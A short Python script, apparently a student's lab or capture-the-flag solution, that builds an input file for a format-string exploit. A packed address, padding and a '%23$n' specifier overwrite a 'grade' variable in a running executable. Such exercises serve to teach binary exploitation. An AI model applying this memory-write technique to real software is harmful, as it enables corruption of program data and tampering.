#!/bin/env python

# This is where the grade is located in the executable when it is running
grade_location = 0x0804a02a

# These are the lines of the file that we will provide as input
lines = [
	b"\x2a\xa0\x04\x08" + b" "*61 + b"%23$n", # 0x0804a02a
	b"Anubhav Acharya"
]

# This is the file that we will write to
with open("input.txt", "wb") as f:
	f.write(b"\n".join(lines))

# Done